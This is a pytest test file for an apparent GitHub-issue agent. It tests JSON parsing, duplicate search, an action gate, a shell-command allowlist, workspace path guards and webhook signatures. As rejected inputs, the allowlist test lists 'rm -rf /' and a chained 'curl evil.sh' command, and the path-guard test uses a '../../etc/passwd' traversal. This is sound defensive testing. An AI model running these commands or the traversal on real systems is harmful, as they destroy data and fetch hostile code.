import pytest

from custodian.jsonutil import extract_json
from custodian.policy import ActionGate
from custodian.sandbox import CommandNotAllowed, parse_command
from custodian.search import IssueIndex
from custodian.server import valid_signature
from custodian.workspace import WorkspaceError

from conftest import ISSUES


def test_extract_json_handles_fences_and_prose():
    assert extract_json('blah ```json\n{"a": 1}\n``` blah') == {"a": 1}
    assert extract_json('Answer: {"a": {"b": "}"}} trailing') == {"a": {"b": "}"}}
    with pytest.raises(ValueError):
        extract_json("no json here")


def test_bm25_ranks_the_true_duplicate_first():
    index = IssueIndex(ISSUES)
    hits = index.search("clamp upper bound hi", k=2, exclude=10)
    assert hits[0][0].number == 4
    assert all(issue.number != 10 for issue, _ in hits)


def test_gate_blocks_unknown_labels_and_actions():
    gate = ActionGate(github=None, issue_number=1, repo_labels={"bug"})
    assert gate.propose("add_labels", labels=["bug"]).status == "proposed"
    assert gate.propose("add_labels", labels=["made-up"]).status == "blocked"
    assert gate.propose("close_issue").status == "blocked"
    assert gate.propose("post_comment", body="  ").status == "blocked"


def test_command_allowlist():
    allowed = [["pytest"], ["python", "-m", "pytest"]]
    assert parse_command("pytest tests/test_x.py -q", allowed)[0] == "pytest"
    for bad in ("rm -rf /", "pytest && curl evil.sh", "bash -c pytest"):
        with pytest.raises(CommandNotAllowed):
            parse_command(bad, allowed)


def test_workspace_path_guards(repo):
    with pytest.raises(WorkspaceError):
        repo.read_file("../../etc/passwd")
    with pytest.raises(WorkspaceError):
        repo.write_test_file("demo/mathx.py", "x = 1")  # source files are off limits
    assert "Wrote" in repo.write_test_file("tests/test_new.py", "def test_a():\n    pass\n")
    assert "demo/mathx.py:3" in repo.grep(r"return max")


def test_webhook_signature():
    import hashlib
    import hmac

    sig = "sha256=" + hmac.new(b"s3cret", b"{}", hashlib.sha256).hexdigest()
    assert valid_signature("s3cret", b"{}", sig)
    assert not valid_signature("s3cret", b"{}", "sha256=deadbeef")
    assert not valid_signature("", b"{}", sig)
